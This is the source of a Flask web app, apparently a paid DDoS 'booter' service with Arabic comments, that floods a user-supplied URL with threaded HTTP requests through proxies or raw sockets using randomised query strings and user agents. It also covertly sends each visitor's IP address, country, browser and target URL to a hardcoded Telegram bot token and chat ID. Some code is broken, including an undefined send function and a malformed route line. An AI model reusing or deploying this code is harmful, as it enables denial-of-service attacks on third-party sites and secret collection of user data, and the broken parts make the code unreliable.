from flask import Flask, request, render_template, jsonify
import threading
import random
from contextlib import suppress
from requests import Session
from urllib.parse import urlparse
from user_agent import generate_user_agent
import socket
import requests

app = Flask(__name__)

# Global variables for tracking requests and bytes sent
REQUESTS_SENT = 0
BYTES_SEND = 0

# إعدادات تيليجرام
mrbtoken = "7412876596:AAHx3gE2x6DVQ7T6HSxLbuBv1jE-hoMX0qA"
mrbid = "5179397749"

class ProxyTools:
    class Random:
        @staticmethod
        def rand_str(length):
            """Generate a random string of fixed length."""
            import string
            return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

class Tools:
    @staticmethod
    def sizeOfRequest(response):
        """Calculate the size of the request in bytes."""
        return len(response.content)

    @staticmethod
    def safe_close(session):
        """Safely close a session or connection."""
        if session:
            try:
                session.close()
            except:
                pass

    @staticmethod
    def send_to_telegram(message):
        """إرسال رسالة إلى بوت تيليجرام."""
        url = f"https://api.telegram.org/bot{mrbtoken}/sendMessage"
        payload = {"chat_id": mrbid, "text": message, "parse_mode": "HTML"}
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"فشل إرسال الرسالة إلى تيليجرام: {e}")

class Target:
    def __init__(self, url):
        self.url = url

    @property
    def human_repr(self):
        """Human-readable representation of the target."""
        return self.url

    @property
    def raw_path_qs(self):
        """Raw path and query string of the target."""
        parsed = urlparse(self.url)
        return parsed.path + ('?' + parsed.query if parsed.query else '')

    @property
    def authority(self):
        """Authority part of the URL (host:port)."""
        parsed = urlparse(self.url)
        return parsed.netloc

class RequestHandler:
    def __init__(self, target, proxies=None, rpc=10, req_type="GET"):
        self._target = Target(target)
        self._proxies = proxies
        self._rpc = rpc
        self._req_type = req_type
        self.randHeadercontent = "User-Agent: " + generate_user_agent() + "\r\n"

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = random.choice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr, proxies=pro) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Connection: Keep-Alive\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def NAME_CHECK(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), Session() as s:
            headers = {"User-Agent": generate_user_agent()}
            res = s.get(self._target.human_repr, headers=headers)
            REQUESTS_SENT += 1
            BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def open_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._target.authority.split(':')[0], 80))
        return s

@app.route("/", methods=["GET"])
def home():
    return render_template("home.html")
@app.route('/buy') def new_page():     return render_template('buy.html')
@app.route("/mrb260", methods=["GET", "POST"])
def index():
    global REQUESTS_SENT, BYTES_SEND

    if request.method == "POST":
        url = request.form.get("url")
        check_type = request.form.get("check_type")
        num_threads = int(request.form.get("num_threads", 10))

        if not url:
            return jsonify({"error": "يرجى إدخال رابط URL!"})

        user_ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")
        try:
            location_data = requests.get(f"http://ipinfo.io/{user_ip}/json").json()
            user_country = location_data.get("country", "غير معروف")
        except:
            user_country = "غير معروف"

        message = f"""
<b>🔔 طلب جديد تم إرساله!</b>

🌐 <b>رابط الفحص:</b> {url}
📌 <b>نوع الفحص:</b> {check_type}

👤 <b>معلومات المستخدم:</b>
- 📱 <b>IP:</b> {user_ip}
- 🌍 <b>الدولة:</b> {user_country}
- 💻 <b>المتصفح:</b> {user_agent}

📊 <b>تفاصيل الطلب:</b>
- 🔄 <b>عدد الطلبات المرسلة:</b> {REQUESTS_SENT}
- 📦 <b>حجم البيانات المرسلة (بالبايت):</b> {BYTES_SEND}
"""
        Tools.send_to_telegram(message)

        threads = []
        for _ in range(num_threads):
            handler = RequestHandler(url, req_type="GET")
            if check_type == "proxy":
                thread = threading.Thread(target=handler.BYPASS)
            elif check_type == "no_proxy":
                thread = threading.Thread(target=handler.GSB)
            elif check_type == "name_check":
                thread = threading.Thread(target=handler.NAME_CHECK)
            else:
                return jsonify({"error": "نوع الفحص غير صحيح!"})

            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        return jsonify({"requests_sent": REQUESTS_SENT, "bytes_sent": BYTES_SEND})

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5010)
